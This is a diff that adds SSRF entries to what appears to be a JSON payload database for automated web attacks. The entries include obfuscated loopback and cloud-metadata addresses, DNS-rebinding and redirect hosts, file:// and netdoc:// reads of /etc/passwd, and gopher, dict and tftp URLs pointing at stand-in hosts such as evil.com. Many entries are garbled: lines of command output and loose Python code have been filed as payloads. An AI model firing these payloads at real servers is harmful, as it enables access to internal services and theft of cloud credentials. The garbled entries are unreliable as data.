@@ -14870,5 +14870,2623 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-237656",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ dig cname.example.com +noall +answer",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-237657",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-237658",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ";; global options: +cmd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-237659",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "cname.example.com.            381     IN      CNAME   target.local.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-237660",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ dig www.example.com +noall +answer",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-237661",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "localhost.example.com.            381     IN      CNAME   localhost.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242755",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url = input(\"Enter URL:\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242756",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "response = requests.get(url)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242757",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return response",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242758",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://localhost:443",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242759",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://127.0.0.1:443",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242760",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0.0.0.0:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242761",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0.0.0.0:22",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242762",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://0.0.0.0:443",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242763",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[::]:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242764",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[0000::1]:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242765",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242766",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[::ffff:127.0.0.1]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242767",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242768",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.127.127.127",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242769",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.0.1.3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242770",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.0.0.0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242771",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242772",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242773",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242774",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://2130706433/ = http://127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242775",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://3232235521/ = http://192.168.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242776",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://3232235777/ = http://192.168.1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242777",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://2852039166/ = http://169.254.169.254",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242778",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0177.0.0.1/ = http://127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242779",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://o177.0.0.1/ = http://127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242780",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0o177.0.0.1/ = http://127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242781",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://q177.0.0.1/ = http://127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242782",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0x7f000001 = http://127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242783",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0xc0a80101 = http://192.168.1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242784",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0xa9fea9fe = http://169.254.169.254",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242785",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.0.0.1/%61dmin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242786",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.0.0.1/%2561dmin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242787",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242788",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://ip6-localhost = ::1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242789",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://ip6-loopback = ::1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242790",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://307.r3dir.me/--to/?url=http://localhost",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242791",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242792",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242793",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242794",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242795",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Address: 1.2.3.4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242796",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Address: 169.254.169.254",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242797",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.1.1.1:80\\@127.2.2.2:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242798",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.1.1.1:80\\@@127.2.2.2:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242799",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.1.1.1:80:\\@@127.2.2.2:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242800",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.1.1.1:80#\\@127.2.2.2:80/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242801",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http:127.0.0.1/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242802",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "echo var_dump(filter_var(\"http://test???test.com\", FILTER_VALIDATE_URL));",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242803",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "echo var_dump(filter_var(\"0://evil.com;google.com\", FILTER_VALIDATE_URL));",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242804",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ ping PayloadsAllTheThings.localhost -c 1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242805",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "PING PayloadsAllTheThings.localhost (::1) 56 data bytes",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242806",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "64 bytes from ip6-localhost (::1): icmp_seq=1 ttl=64 time=0.070 ms",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242807",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "--- PayloadsAllTheThings.localhost ping statistics ---",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242808",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "1 packets transmitted, 1 received, 0% packet loss, time 0ms",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242809",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtt min/avg/max/mdev = 0.070/0.070/0.070/0.000 ms",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242810",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jar:scheme://domain/path!/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242811",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jar:http://127.0.0.1!/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242812",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jar:https://127.0.0.1!/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242813",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jar:ftp://127.0.0.1!/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242814",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Linux",
+    "injection_point": "query_parameter",
+    "payload_string": "file://\\/\\/etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242815",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=http://127.0.0.1:22",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242816",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=http://127.0.0.1:80",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242817",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=http://127.0.0.1:443",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242818",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242819",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=dict://attacker:11111/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242820",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=sftp://evil.com:11111/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242821",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242822",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=ldap://localhost:11211/%0astats%0aquit",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242823",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Linux",
+    "injection_point": "query_parameter",
+    "payload_string": "ssrf.php?url=netdoc:///etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242824",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://[host]:[port]/[type][selector]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242825",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242826",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242827",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "from urllib.parse import quote",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242828",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "domain,tld = \"example.lab\".split('.')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242829",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request =  b\"\\x01\\x03\\x03\\x07\"    # BITMAP",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242830",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += b\"\\x00\\x01\"            # QCOUNT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242831",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += b\"\\x00\\x00\"            # ANCOUNT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242832",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += b\"\\x00\\x00\"            # NSCOUNT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242833",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += b\"\\x00\\x00\"            # ARCOUNT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242834",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += len(domain).to_bytes() # LEN DOMAIN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242835",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += domain.encode()        # DOMAIN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242836",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += len(tld).to_bytes()    # LEN TLD",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242837",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += tld.encode()           # TLD",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242838",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += b\"\\x00\"                # DNAME EOF",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
